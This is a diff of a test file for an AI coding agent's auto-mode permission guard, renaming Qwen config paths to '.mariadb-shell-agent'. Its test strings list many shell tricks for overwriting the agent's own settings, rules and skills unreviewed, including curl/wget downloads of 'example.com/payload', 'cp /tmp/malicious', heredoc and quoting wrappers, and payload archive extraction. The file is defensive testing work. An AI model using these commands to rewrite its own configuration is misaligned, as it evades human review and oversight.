@@ -1,6 +1,7 @@
 /**
  * @license
  * Copyright 2025 Qwen Team
+ * Copyright (c) 2026, MariaDB plc.
  * SPDX-License-Identifier: Apache-2.0
  */
 
@@ -194,17 +195,17 @@ describe('isAutoModeProtectedWritePath', () => {
 
   it('matches Qwen self-modification files and directories', () => {
     expectProtected([
-      '/repo/.qwen/settings.json',
-      '/repo/.qwen/settings.local.json',
-      '/repo/QWEN.md',
+      '/repo/.mariadb-shell-agent/settings.json',
+      '/repo/.mariadb-shell-agent/settings.local.json',
+      '/repo/MARIADB-SHELL-AGENT.md',
       '/repo/AGENTS.md',
-      '/repo/.qwen/commands/review.md',
-      '/repo/.qwen/agents/reviewer.md',
-      '/repo/.qwen/skills/skill-a/SKILL.md',
-      '/repo/.qwen/hooks/pre-tool-use.json',
-      '/repo/.qwen/fork-profiles/ro-research.md',
-      '/repo/.qwen/QWEN.local.md',
-      '/repo/.qwen/rules/backend.md',
+      '/repo/.mariadb-shell-agent/commands/review.md',
+      '/repo/.mariadb-shell-agent/agents/reviewer.md',
+      '/repo/.mariadb-shell-agent/skills/skill-a/SKILL.md',
+      '/repo/.mariadb-shell-agent/hooks/pre-tool-use.json',
+      '/repo/.mariadb-shell-agent/fork-profiles/ro-research.md',
+      '/repo/.mariadb-shell-agent/MARIADB-SHELL-AGENT.local.md',
+      '/repo/.mariadb-shell-agent/rules/backend.md',
       '/repo/.mcp.json',
       '/repo/.git',
     ]);
@@ -214,8 +215,8 @@ describe('isAutoModeProtectedWritePath', () => {
     expectProtected(
       [
         '/repo/src/index.ts',
-        '/repo/.qwen/PROJECT_SUMMARY.md',
-        '/repo/.qwen/worktrees/feature/src/index.ts',
+        '/repo/.mariadb-shell-agent/PROJECT_SUMMARY.md',
+        '/repo/.mariadb-shell-agent/worktrees/feature/src/index.ts',
       ],
       false,
     );
@@ -223,21 +224,21 @@ describe('isAutoModeProtectedWritePath', () => {
 
   it('still protects config surfaces inside managed worktrees', () => {
     expectProtected([
-      '/repo/.qwen/worktrees/feature/.qwen/settings.json',
-      '/repo/.qwen/worktrees/feature/AGENTS.md',
-      '/repo/.qwen/worktrees/feature/.qwen/QWEN.local.md',
-      '/repo/.qwen/worktrees/feature/.qwen/rules/backend.md',
-      '/repo/.qwen/worktrees/feature/.mcp.json',
+      '/repo/.mariadb-shell-agent/worktrees/feature/.mariadb-shell-agent/settings.json',
+      '/repo/.mariadb-shell-agent/worktrees/feature/AGENTS.md',
+      '/repo/.mariadb-shell-agent/worktrees/feature/.mariadb-shell-agent/MARIADB-SHELL-AGENT.local.md',
+      '/repo/.mariadb-shell-agent/worktrees/feature/.mariadb-shell-agent/rules/backend.md',
+      '/repo/.mariadb-shell-agent/worktrees/feature/.mcp.json',
     ]);
   });
 
   it('matches protected paths case-insensitively', () => {
     expectProtected([
-      '/repo/qwen.md',
+      '/repo/mariadb-shell-agent.md',
       '/repo/agents.md',
-      '/repo/.QWEN/SETTINGS.JSON',
-      '/repo/.QWEN/QWEN.LOCAL.MD',
-      '/repo/.QWEN/RULES/backend.md',
+      '/repo/.MARIADB-SHELL-AGENT/SETTINGS.JSON',
+      '/repo/.MARIADB-SHELL-AGENT/MARIADB-SHELL-AGENT.LOCAL.MD',
+      '/repo/.MARIADB-SHELL-AGENT/RULES/backend.md',
       '/repo/.MCP.JSON',
       '/repo/GNUmakefile',
       '/repo/Taskfile.yaml',
@@ -251,10 +252,10 @@ describe('isAutoModeProtectedWritePath', () => {
       expectProtected([
         '/repo/CUSTOM_AGENTS.md',
         '/repo/docs/TEAM_CONTEXT.md',
-        '/repo/.qwen/worktrees/feature/CUSTOM_AGENTS.md',
+        '/repo/.mariadb-shell-agent/worktrees/feature/CUSTOM_AGENTS.md',
       ]);
     } finally {
-      setMemoryFilename(['QWEN.md', 'AGENTS.md']);
+      setMemoryFilename(['MARIADB-SHELL-AGENT.md', 'AGENTS.md']);
     }
   });
 
@@ -264,7 +265,7 @@ describe('isAutoModeProtectedWritePath', () => {
       expectProtected([
         '/tmp/custom-qwen-home/settings.json',
         '/tmp/custom-qwen-home/settings.local.json',
-        '/tmp/custom-qwen-home/QWEN.local.md',
+        '/tmp/custom-qwen-home/MARIADB-SHELL-AGENT.local.md',
         '/tmp/custom-qwen-home/commands/review.md',
         '/tmp/custom-qwen-home/agents/reviewer.md',
         '/tmp/custom-qwen-home/skills/review/SKILL.md',
@@ -295,7 +296,7 @@ describe('isAutoModeProtectedWritePath', () => {
 
   it('re-resolves write paths after symlinks are created', () => {
     inTmpDir('qwen-write-path-', (tmpRoot) => {
-      const protectedDir = path.join(tmpRoot, '.qwen');
+      const protectedDir = path.join(tmpRoot, '.mariadb-shell-agent');
       const settingsPath = path.join(protectedDir, 'settings.json');
       const linkPath = path.join(tmpRoot, 'scratch');
       fs.mkdirSync(protectedDir, { recursive: true });
@@ -350,17 +351,17 @@ describe('passesAcceptEditsFastPath', () => {
 
   it('rejects Qwen self-modification paths even inside cwd', () => {
     const protectedPaths = [
-      `${cwd}/.qwen/settings.json`,
-      `${cwd}/.qwen/settings.local.json`,
-      `${cwd}/QWEN.md`,
+      `${cwd}/.mariadb-shell-agent/settings.json`,
+      `${cwd}/.mariadb-shell-agent/settings.local.json`,
+      `${cwd}/MARIADB-SHELL-AGENT.md`,
       `${cwd}/AGENTS.md`,
-      `${cwd}/.qwen/commands/review.md`,
-      `${cwd}/.qwen/agents/reviewer.md`,
-      `${cwd}/.qwen/skills/review/SKILL.md`,
-      `${cwd}/.qwen/hooks/pre-tool-use.json`,
-      `${cwd}/.qwen/fork-profiles/ro-research.md`,
-      `${cwd}/.qwen/QWEN.local.md`,
-      `${cwd}/.qwen/rules/backend.md`,
+      `${cwd}/.mariadb-shell-agent/commands/review.md`,
+      `${cwd}/.mariadb-shell-agent/agents/reviewer.md`,
+      `${cwd}/.mariadb-shell-agent/skills/review/SKILL.md`,
+      `${cwd}/.mariadb-shell-agent/hooks/pre-tool-use.json`,
+      `${cwd}/.mariadb-shell-agent/fork-profiles/ro-research.md`,
+      `${cwd}/.mariadb-shell-agent/MARIADB-SHELL-AGENT.local.md`,
+      `${cwd}/.mariadb-shell-agent/rules/backend.md`,
       `${cwd}/.mcp.json`,
     ];
 
@@ -371,20 +372,23 @@ describe('passesAcceptEditsFastPath', () => {
     }
   });
 
-  it('allows ordinary files under .qwen/worktrees but rejects nested config surfaces', () => {
-    const worktree = `${cwd}/.qwen/worktrees/feature`;
+  it('allows ordinary files under .mariadb-shell-agent/worktrees but rejects nested config surfaces', () => {
+    const worktree = `${cwd}/.mariadb-shell-agent/worktrees/feature`;
     expect(fastPath(ToolNames.WRITE_FILE, `${worktree}/src/index.ts`)).toBe(
       true,
     );
 
     expect(
-      fastPath(ToolNames.WRITE_FILE, `${worktree}/.qwen/settings.json`),
+      fastPath(
+        ToolNames.WRITE_FILE,
+        `${worktree}/.mariadb-shell-agent/settings.json`,
+      ),
     ).toBe(false);
   });
 
   it('rejects symlinks that resolve to protected self-modification paths', () => {
     inTmpDir('qwen-auto-mode-', (tmpRoot) => {
-      const qwenDir = path.join(tmpRoot, '.qwen');
+      const qwenDir = path.join(tmpRoot, '.mariadb-shell-agent');
       fs.mkdirSync(qwenDir, { recursive: true });
       const target = path.join(qwenDir, 'settings.json');
       fs.writeFileSync(target, '{}');
@@ -467,27 +471,35 @@ describe('shouldForceAutoModeReviewForAllow', () => {
 
   it('returns true for Edit/Write targeting protected self-modification paths', () => {
     expect(
-      forcesReviewOf(ToolNames.EDIT, '/Users/test/.qwen/settings.json'),
+      forcesReviewOf(
+        ToolNames.EDIT,
+        '/Users/test/.mariadb-shell-agent/settings.json',
+      ),
     ).toBe(true);
 
     expect(
-      forcesReviewOf(ToolNames.WRITE_FILE, '/repo/.qwen/QWEN.local.md'),
+      forcesReviewOf(
+        ToolNames.WRITE_FILE,
+        '/repo/.mariadb-shell-agent/MARIADB-SHELL-AGENT.local.md',
+      ),
     ).toBe(true);
 
     expect(
       forcesReviewOf(
         ToolNames.NOTEBOOK_EDIT,
-        '/repo/.qwen/skills/review/demo.ipynb',
+        '/repo/.mariadb-shell-agent/skills/review/demo.ipynb',
       ),
     ).toBe(true);
   });
 
   it('returns true for shell-like commands writing protected paths', () => {
-    expect(forcesReview('echo "{}" > .qwen/settings.json')).toBe(true);
+    expect(forcesReview('echo "{}" > .mariadb-shell-agent/settings.json')).toBe(
+      true,
+    );
 
     expect(
       forcesReview(
-        'bash -lc \'echo "{}" > .qwen/settings.json\'',
+        'bash -lc \'echo "{}" > .mariadb-shell-agent/settings.json\'',
         ToolNames.MONITOR,
       ),
     ).toBe(true);
@@ -498,9 +510,11 @@ describe('shouldForceAutoModeReviewForAllow', () => {
     // cross-segment cd tracking AND recursive wrapper unwrapping, this payload
     // would slip past AUTO force-review, and a `permissions.allow: ["Bash(*)"]`
     // rule plus this command would silently overwrite settings.json.
-    expect(forcesReview("cd .qwen && bash -lc 'echo {} > settings.json'")).toBe(
-      true,
-    );
+    expect(
+      forcesReview(
+        "cd .mariadb-shell-agent && bash -lc 'echo {} > settings.json'",
+      ),
+    ).toBe(true);
   });
 
   it('returns true for relative writes after an unresolved dynamic `cd`', () => {
@@ -522,11 +536,13 @@ describe('shouldForceAutoModeReviewForAllow', () => {
   });
 
   it('returns true for shell-like commands writing protected paths after cd', () => {
-    expect(forcesReview('cd .qwen && echo "{}" > settings.json')).toBe(true);
+    expect(
+      forcesReview('cd .mariadb-shell-agent && echo "{}" > settings.json'),
+    ).toBe(true);
 
     expect(
       forcesReview(
-        'bash -lc \'cd .qwen && echo "{}" > settings.json\'',
+        'bash -lc \'cd .mariadb-shell-agent && echo "{}" > settings.json\'',
         ToolNames.MONITOR,
       ),
     ).toBe(true);
@@ -534,45 +550,55 @@ describe('shouldForceAutoModeReviewForAllow', () => {
 
   it('returns true for protected writes in sibling segments after shell wrappers', () => {
     expect(
-      forcesReview("bash -lc 'echo ok' && echo hi > .qwen/settings.json"),
+      forcesReview(
+        "bash -lc 'echo ok' && echo hi > .mariadb-shell-agent/settings.json",
+      ),
     ).toBe(true);
   });
 
   it('returns true for newline-separated protected shell writes after cd', () => {
-    expect(forcesReview('cd .qwen\ncp /tmp/malicious settings.json')).toBe(
-      true,
-    );
+    expect(
+      forcesReview('cd .mariadb-shell-agent\ncp /tmp/malicious settings.json'),
+    ).toBe(true);
   });
 
   it('returns true for grouped and metacharacter-suffixed protected writes', () => {
-    expect(forcesReview("{ cd .qwen && echo '{}' > settings.json; }")).toBe(
+    expect(
+      forcesReview("{ cd .mariadb-shell-agent && echo '{}' > settings.json; }"),
+    ).toBe(true);
+
+    expect(forcesReview('(echo > .mariadb-shell-agent/settings.json)')).toBe(
       true,
     );
-
-    expect(forcesReview('(echo > .qwen/settings.json)')).toBe(true);
   });
 
   it('returns true for protected writes embedded in shell heredoc bodies', () => {
-    expect(forcesReview(heredoc("echo '{}' > .qwen/settings.json"))).toBe(true);
+    expect(
+      forcesReview(heredoc("echo '{}' > .mariadb-shell-agent/settings.json")),
+    ).toBe(true);
   });
 
   it('returns true for protected write commands embedded in heredoc bodies', () => {
-    expect(forcesReview(heredoc('cp /tmp/payload .qwen/settings.json'))).toBe(
-      true,
-    );
+    expect(
+      forcesReview(
+        heredoc('cp /tmp/payload .mariadb-shell-agent/settings.json'),
+      ),
+    ).toBe(true);
 
     for (const body of [
-      "tee .qwen/settings.json <<< '{}'",
-      'dd if=/tmp/payload of=.qwen/settings.json',
-      'sort -o .qwen/settings.json /dev/null',
-      "node -e \"require('fs').writeFileSync('.qwen/settings.json', '{}')\"",
+      "tee .mariadb-shell-agent/settings.json <<< '{}'",
+      'dd if=/tmp/payload of=.mariadb-shell-agent/settings.json',
+      'sort -o .mariadb-shell-agent/settings.json /dev/null',
+      "node -e \"require('fs').writeFileSync('.mariadb-shell-agent/settings.json', '{}')\"",
     ]) {
       expect(forcesReview(heredoc(body))).toBe(true);
     }
   });
 
   it('returns true for protected write commands with variable destinations', () => {
-    expect(forcesReview('D=.qwen/settings.json; cp payload "$D"')).toBe(true);
+    expect(
+      forcesReview('D=.mariadb-shell-agent/settings.json; cp payload "$D"'),
+    ).toBe(true);
   });
 
   it('does not force review for awk field references', () => {
@@ -581,8 +607,8 @@ describe('shouldForceAutoModeReviewForAllow', () => {
 
   it('returns true for awk in-place edits to protected paths', () => {
     for (const command of [
-      'awk -i inplace \'{gsub(/x/, "y")}1\' .qwen/settings.json',
-      'gawk -i inplace \'{gsub(/x/, "y")}1\' .qwen/settings.json',
+      'awk -i inplace \'{gsub(/x/, "y")}1\' .mariadb-shell-agent/settings.json',
+      'gawk -i inplace \'{gsub(/x/, "y")}1\' .mariadb-shell-agent/settings.json',
     ]) {
       expect(forcesReview(command)).toBe(true);
     }
@@ -590,46 +616,54 @@ describe('shouldForceAutoModeReviewForAllow', () => {
 
   it('returns true for sort writing protected paths via output flags', () => {
     for (const command of [
-      'sort -o .qwen/settings.json /dev/null',
-      'sort --output=.qwen/settings.json /dev/null',
+      'sort -o .mariadb-shell-agent/settings.json /dev/null',
+      'sort --output=.mariadb-shell-agent/settings.json /dev/null',
     ]) {
       expect(forcesReview(command)).toBe(true);
     }
   });
 
   it('returns true for protected heredoc redirects with repeated quote tokens', () => {
-    expect(forcesReview(heredoc('echo "{}" > """.qwen/settings.json"""'))).toBe(
-      true,
-    );
+    expect(
+      forcesReview(
+        heredoc('echo "{}" > """.mariadb-shell-agent/settings.json"""'),
+      ),
+    ).toBe(true);
   });
 
   it('returns true for protected clobber and fd redirects', () => {
     for (const command of [
-      "echo '{}' >| .qwen/settings.json",
-      "echo '{}' >& .qwen/settings.json",
+      "echo '{}' >| .mariadb-shell-agent/settings.json",
+      "echo '{}' >& .mariadb-shell-agent/settings.json",
     ]) {
       expect(forcesReview(command)).toBe(true);
     }
   });
 
   it('returns true for ANSI-C quoted protected redirect targets', () => {
-    expect(forcesReview("echo '{}' > $'.qwen/settings.json'")).toBe(true);
+    expect(
+      forcesReview("echo '{}' > $'.mariadb-shell-agent/settings.json'"),
+    ).toBe(true);
   });
 
   it('returns true for bidirectional redirects to protected paths', () => {
-    expect(forcesReview('cat <> .qwen/settings.json')).toBe(true);
+    expect(forcesReview('cat <> .mariadb-shell-agent/settings.json')).toBe(
+      true,
+    );
   });
 
   it('returns true for target-directory writes to protected filenames', () => {
-    expect(forcesReview('cp -t .qwen /tmp/settings.json')).toBe(true);
+    expect(forcesReview('cp -t .mariadb-shell-agent /tmp/settings.json')).toBe(
+      true,
+    );
   });
 
   it('returns true for downloader output flags targeting protected paths', () => {
     for (const command of [
-      'curl -o .qwen/settings.json https://example.com/payload',
-      'curl -o.qwen/settings.json https://example.com/payload',
-      'wget -O .qwen/settings.json https://example.com/payload',
-      'wget -O.qwen/settings.json https://example.com/payload',
+      'curl -o .mariadb-shell-agent/settings.json https://example.com/payload',
+      'curl -o.mariadb-shell-agent/settings.json https://example.com/payload',
+      'wget -O .mariadb-shell-agent/settings.json https://example.com/payload',
+      'wget -O.mariadb-shell-agent/settings.json https://example.com/payload',
     ]) {
       expect(forcesReview(command)).toBe(true);
     }
@@ -637,13 +671,13 @@ describe('shouldForceAutoModeReviewForAllow', () => {
 
   it('returns true for archive extraction commands targeting protected dirs', () => {
     for (const command of [
-      'tar xf payload.tar -C .qwen/skills',
-      'tar xf payload.tar -C.qwen/skills',
-      'tar xf payload.tar --directory=.qwen/skills',
-      'unzip payload.zip -d .qwen/skills',
-      'unzip payload.zip -d.qwen/skills',
-      'cpio -i -D .qwen/skills',
-      'cpio -i -D.qwen/skills',
+      'tar xf payload.tar -C .mariadb-shell-agent/skills',
+      'tar xf payload.tar -C.mariadb-shell-agent/skills',
+      'tar xf payload.tar --directory=.mariadb-shell-agent/skills',
+      'unzip payload.zip -d .mariadb-shell-agent/skills',
+      'unzip payload.zip -d.mariadb-shell-agent/skills',
+      'cpio -i -D .mariadb-shell-agent/skills',
+      'cpio -i -D.mariadb-shell-agent/skills',
     ]) {
       expect(forcesReview(command)).toBe(true);
     }
@@ -651,28 +685,32 @@ describe('shouldForceAutoModeReviewForAllow', () => {
 
   it('returns true for patch output flags targeting protected paths', () => {
     for (const command of [
-      'patch --output=.qwen/settings.json -i fix.patch',
-      'patch -o.qwen/settings.json -i fix.patch',
+      'patch --output=.mariadb-shell-agent/settings.json -i fix.patch',
+      'patch -o.mariadb-shell-agent/settings.json -i fix.patch',
     ]) {
       expect(forcesReview(command)).toBe(true);
     }
   });
 
   it('returns true for find exec writes with placeholder operands', () => {
-    expect(forcesReview('find . -exec cp {} .qwen/settings.json ;')).toBe(true);
+    expect(
+      forcesReview('find . -exec cp {} .mariadb-shell-agent/settings.json ;'),
+    ).toBe(true);
   });
 
   it('returns true for find execdir writes with placeholder operands', () => {
-    expect(forcesReview('find . -execdir cp {} .qwen/settings.json ;')).toBe(
-      true,
-    );
+    expect(
+      forcesReview(
+        'find . -execdir cp {} .mariadb-shell-agent/settings.json ;',
+      ),
+    ).toBe(true);
   });
 
   it('returns true for long in-place sed/perl writes to protected paths', () => {
     for (const command of [
-      "sed --in-place 's/x/y/' .qwen/settings.json",
-      "sed --in-place=.bak 's/x/y/' .qwen/settings.json",
-      "perl --in-place -e 's/x/y/' .qwen/settings.json",
+      "sed --in-place 's/x/y/' .mariadb-shell-agent/settings.json",
+      "sed --in-place=.bak 's/x/y/' .mariadb-shell-agent/settings.json",
+      "perl --in-place -e 's/x/y/' .mariadb-shell-agent/settings.json",
     ]) {
       expect(forcesReview(command)).toBe(true);
     }
@@ -682,7 +720,7 @@ describe('shouldForceAutoModeReviewForAllow', () => {
     for (const command of [
       "sed 's/a/b/' /tmp/file",
       "perl -e 'print $_' /tmp/file",
-      "sed -n '1,10p' .qwen/settings.json",
+      "sed -n '1,10p' .mariadb-shell-agent/settings.json",
     ]) {
       expect(forcesReview(command)).toBe(false);
     }
@@ -693,7 +731,7 @@ describe('shouldForceAutoModeReviewForAllow', () => {
       shouldForceAutoModeReviewForAllow(
         ctx({
           toolName: ToolNames.SHELL,
-          command: 'echo "{}" > .qwen/settings.json',
+          command: 'echo "{}" > .mariadb-shell-agent/settings.json',
         }),
         '/repo',
       ),
@@ -704,7 +742,10 @@ describe('shouldForceAutoModeReviewForAllow', () => {
     expect(forcesReviewOf(ToolNames.EDIT, '/repo/src/index.ts')).toBe(false);
 
     expect(
-      forcesReviewOf(ToolNames.READ_FILE, '/repo/.qwen/settings.json'),
+      forcesReviewOf(
+        ToolNames.READ_FILE,
+        '/repo/.mariadb-shell-agent/settings.json',
+      ),
     ).toBe(false);
 
     expect(forcesReview('echo "ok" > src/output.txt')).toBe(false);
@@ -878,7 +919,7 @@ describe('evaluateAutoMode — fast-path gating', () => {
 
   it('routes in-workspace protected writes to classifier', async () => {
     const decision = await evaluate(
-      onFile(ToolNames.EDIT, `${cwd}/.qwen/settings.json`),
+      onFile(ToolNames.EDIT, `${cwd}/.mariadb-shell-agent/settings.json`),
     );
     expect(decision.via).toBe('classifier');
   });
